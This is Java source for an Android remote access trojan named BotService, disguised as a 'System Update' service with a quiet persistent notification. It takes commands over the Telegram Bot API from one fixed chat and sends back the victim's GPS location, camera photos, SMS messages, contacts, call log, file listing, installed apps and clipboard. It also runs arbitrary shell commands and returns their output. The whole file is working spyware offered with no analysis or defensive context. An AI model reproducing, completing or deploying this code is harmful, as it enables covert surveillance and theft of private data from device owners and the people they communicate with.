package com.system.update;
import android.app.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.graphics.*;
import android.hardware.camera2.*;
import android.location.*;
import android.media.*;
import android.net.Uri;
import android.os.*;
import android.provider.*;
import android.util.Base64;
import org.json.*;
import java.io.*;
import java.util.*;
public class BotService extends Service {
    private long lastId = 0;
    private boolean running = true;
    private LocationManager locMgr;
    @Override
    public void onCreate(){
        super.onCreate();
        try{
            NotificationChannel ch = new NotificationChannel("sys","System",NotificationManager.IMPORTANCE_LOW);
            ch.setShowBadge(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
            Notification n = new Notification.Builder(this,"sys")
                .setContentTitle("System Update").setContentText("Running...")
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .setPriority(Notification.PRIORITY_LOW).build();
            startForeground(1, n);
            locMgr = (LocationManager) getSystemService(LOCATION_SERVICE);
        }catch(Exception e){}
    }
    @Override
    public int onStartCommand(Intent i, int f, int s){
        new Thread(this::poll).start();
        return START_STICKY;
    }
    private void poll(){
        TgApi.send("Online");
        while(running){
            try{
                String url = TgApi.API+"/getUpdates?timeout=25&offset="+(lastId+1);
                String r = TgApi.get(url);
                if(r == null || r.isEmpty()){ Thread.sleep(1500); continue; }
                JSONObject j = new JSONObject(r);
                if(!j.optBoolean("ok", false)){ Thread.sleep(2000); continue; }
                JSONArray a = j.optJSONArray("result");
                if(a == null){ Thread.sleep(1000); continue; }
                for(int k=0;k<a.length();k++){
                    JSONObject u = a.getJSONObject(k);
                    long uid = u.optLong("update_id", -1);
                    if(uid > lastId) lastId = uid;
                    JSONObject m = u.optJSONObject("message");
                    if(m == null) continue;
                    JSONObject chat = m.optJSONObject("chat");
                    if(chat == null) continue;
                    String cid = chat.optString("id","");
                    if(!cid.equals(TgApi.CHAT_ID)) continue;
                    String txt = m.optString("text","");
                    if(txt.isEmpty()) continue;
                    handleMulti(txt);
                }
            }catch(Exception e){
                try{ Thread.sleep(2500); }catch(Exception ex){}
            }
        }
    }
    private void handleMulti(String raw){
        String[] lines = raw.split("\\r?\\n");
        for(String line : lines){
            String cmd = line.trim();
            if(cmd.isEmpty()) continue;
            try{ handle(cmd); }catch(Exception e){ TgApi.send("err "+cmd+": "+e.getMessage()); }
            try{ Thread.sleep(300); }catch(Exception e){}
        }
    }
    private void handle(String cmd){
        String c = cmd.toLowerCase();
        if(c.equals("/start") || c.equals("/help") || c.equals("menu")){
            TgApi.send("MENU:\n" +
                "/info - Device\n" +
                "/loc - Lokasi\n" +
                "/live - Live 60s\n" +
                "/cam - Cam depan\n" +
                "/cam_back - Cam belakang\n" +
                "/sms - SMS\n" +
                "/contacts - Kontak\n" +
                "/callog - Call log\n" +
                "/files - File\n" +
                "/apps - App list\n" +
                "/vibrate - Vibrate\n" +
                "/shell <cmd> - Shell\n" +
                "/clip - Clipboard");
            return;
        }
        if(c.equals("/info")||c.equals("/device")){ TgApi.send("Model: "+Build.MODEL+"\nBrand: "+Build.BRAND+"\nAndroid: "+Build.VERSION.RELEASE+"\nSDK: "+Build.VERSION.SDK_INT); return; }
        if(c.equals("/loc")||c.equals("/location")){ sendLoc(); return; }
        if(c.equals("/live")){ liveLoc(); return; }
        if(c.equals("/cam")||c.equals("/camera")){ capture(0); return; }
        if(c.equals("/cam_back")){ capture(1); return; }
        if(c.equals("/sms")){ sms(); return; }
        if(c.equals("/contacts")){ contacts(); return; }
        if(c.equals("/callog")){ callog(); return; }
        if(c.equals("/files")){ files(); return; }
        if(c.equals("/apps")){ apps(); return; }
        if(c.equals("/vibrate")){ vib(); return; }
        if(c.equals("/clip")){ clip(); return; }
        if(c.startsWith("/shell ")){ shell(cmd.substring(7)); return; }
        TgApi.send("Unknown: "+cmd);
    }
    private void sendLoc(){
        try{
            Location last = null;
            for(String p : locMgr.getProviders(true)){
                Location l = locMgr.getLastKnownLocation(p);
                if(l!=null && (last==null || l.getTime()>last.getTime())) last = l;
            }
            if(last!=null){
                TgApi.sendLoc(last.getLatitude(), last.getLongitude());
                TgApi.send("Lat: "+last.getLatitude()+"\nLon: "+last.getLongitude()+"\nAcc: "+last.getAccuracy()+"m");
            } else TgApi.send("No location. Coba /live");
        }catch(Exception e){ TgApi.send("loc err "+e.getMessage()); }
    }
    private void liveLoc(){
        TgApi.send("Live 60s started");
        final LocationListener ll = new LocationListener(){
            public void onLocationChanged(Location l){
                TgApi.sendLoc(l.getLatitude(), l.getLongitude());
                TgApi.send("Lat: "+l.getLatitude()+"\nLon: "+l.getLongitude());
            }
            public void onStatusChanged(String s,int i,Bundle b){}
            public void onProviderEnabled(String s){}
            public void onProviderDisabled(String s){}
        };
        try{
            locMgr.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 0, ll);
            locMgr.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 0, ll);
        }catch(Exception e){}
        new Handler(Looper.getMainLooper()).postDelayed(()->{
            try{ locMgr.removeUpdates(ll); }catch(Exception e){}
            TgApi.send("Live done");
        }, 60000);
    }
    private void capture(final int facing){
        TgApi.send("Cam capture...");
        try{
            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
            String camId = null;
            for(String id : cm.getCameraIdList()){
                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer f = ch.get(CameraCharacteristics.LENS_FACING);
                if(f!=null && f==facing){ camId=id; break; }
            }
            if(camId==null){ TgApi.send("No camera"); return; }
            cm.openCamera(camId, new CameraDevice.StateCallback(){
                public void onOpened(CameraDevice cam){
                    try{
                        final ImageReader rd = ImageReader.newInstance(640,480,ImageFormat.JPEG,2);
                        rd.setOnImageAvailableListener(r->{
                            Image img = r.acquireLatestImage();
                            if(img!=null){
                                java.nio.ByteBuffer buf = img.getPlanes()[0].getBuffer();
                                byte[] by = new byte[buf.remaining()];
                                buf.get(by); img.close();
                                TgApi.sendPhoto(Base64.encodeToString(by,Base64.NO_WRAP),"Cam "+(facing==0?"front":"back"));
                            }
                            cam.close();
                        }, null);
                        cam.createCaptureSession(Collections.singletonList(rd.getSurface()),
                            new CameraCaptureSession.StateCallback(){
                                public void onConfigured(CameraCaptureSession s){
                                    try{
                                        CaptureRequest.Builder b = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        b.addTarget(rd.getSurface());
                                        s.capture(b.build(), null, null);
                                    }catch(Exception e){}
                                }
                                public void onConfigureFailed(CameraCaptureSession s){}
                            }, null);
                    }catch(Exception e){ TgApi.send("Cam open err: "+e.getMessage()); }
                }
                public void onDisconnected(CameraDevice c){}
                public void onError(CameraDevice c,int e){ TgApi.send("Cam err "+e); }
            }, null);
        }catch(Exception e){ TgApi.send("Cam ex "+e.getMessage()); }
    }
    private void sms(){
        try{
            StringBuilder sb = new StringBuilder();
            android.database.Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"),null,null,null,"date DESC LIMIT 20");
            int n = 0;
            while(c!=null && c.moveToNext()){
                sb.append("[").append(c.getString(c.getColumnIndex("address"))).append("]\n")
                  .append(c.getString(c.getColumnIndex("body"))).append("\n---\n");
                n++;
            }
            if(c!=null)c.close();
            String t = sb.toString();
            if(t.isEmpty()) t = "No SMS";
            if(t.length()>3500) t = t.substring(0,3500);
            TgApi.send(t);
        }catch(Exception e){ TgApi.send("sms err "+e.getMessage()); }
    }
    private void contacts(){
        try{
            StringBuilder sb = new StringBuilder();
            android.database.Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);
            int n=0;
            while(c!=null && c.moveToNext() && n<100){
                sb.append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                  .append(": ")
                  .append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                  .append("\n");
                n++;
            }
            if(c!=null)c.close();
            String t = sb.toString();
            if(t.isEmpty()) t = "No contacts";
            if(t.length()>3500) t = t.substring(0,3500);
            TgApi.send(t);
        }catch(Exception e){ TgApi.send("ct err "+e.getMessage()); }
    }
    private void callog(){
        try{
            StringBuilder sb = new StringBuilder();
            android.database.Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI,null,null,null,"date DESC LIMIT 30");
            while(c!=null && c.moveToNext()){
                sb.append(c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)))
                  .append(" ")
                  .append(c.getString(c.getColumnIndex(CallLog.Calls.DURATION)))
                  .append("s\n");
            }
            if(c!=null)c.close();
            String t = sb.toString();
            if(t.isEmpty()) t = "No call log";
            TgApi.send(t);
        }catch(Exception e){ TgApi.send("cl err "+e.getMessage()); }
    }
    private void files(){
        try{
            StringBuilder sb = new StringBuilder();
            File[] fs = Environment.getExternalStorageDirectory().listFiles();
            if(fs!=null) for(File f : fs) sb.append(f.isDirectory()?"[D] ":"[F] ").append(f.getName()).append("\n");
            String t = sb.toString();
            if(t.isEmpty()) t = "No files";
            if(t.length()>3500) t = t.substring(0,3500);
            TgApi.send(t);
        }catch(Exception e){ TgApi.send("fl err "+e.getMessage()); }
    }
    private void apps(){
        try{
            StringBuilder sb = new StringBuilder();
            PackageManager pm = getPackageManager();
            for(android.content.pm.ApplicationInfo a : pm.getInstalledApplications(0))
                sb.append(a.packageName).append("\n");
            String t = sb.toString();
            if(t.length()>3500) t = t.substring(0,3500);
            TgApi.send(t);
        }catch(Exception e){ TgApi.send("ap err "+e.getMessage()); }
    }
    private void clip(){
        try{
            ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if(cm.hasPrimaryClip()){
                CharSequence t = cm.getPrimaryClip().getItemAt(0).getText();
                TgApi.send("Clip: "+(t!=null?t.toString():""));
            } else TgApi.send("Clip empty");
        }catch(Exception e){ TgApi.send("clip err "+e.getMessage()); }
    }
    private void vib(){
        try{
            Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                v.vibrate(VibrationEffect.createOneShot(2000, VibrationEffect.DEFAULT_AMPLITUDE));
            else v.vibrate(2000);
            TgApi.send("vib OK");
        }catch(Exception e){ TgApi.send("vib err "+e.getMessage()); }
    }
    private void shell(String cmd){
        try{
            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",cmd});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String l;
            while((l=r.readLine())!=null) sb.append(l).append("\n");
            String t = sb.toString();
            if(t.isEmpty()) t = "(no output)";
            if(t.length()>3500) t = t.substring(0,3500);
            TgApi.send(t);
        }catch(Exception e){ TgApi.send("sh err "+e.getMessage()); }
    }
    @Override
    public IBinder onBind(Intent i){ return null; }
}
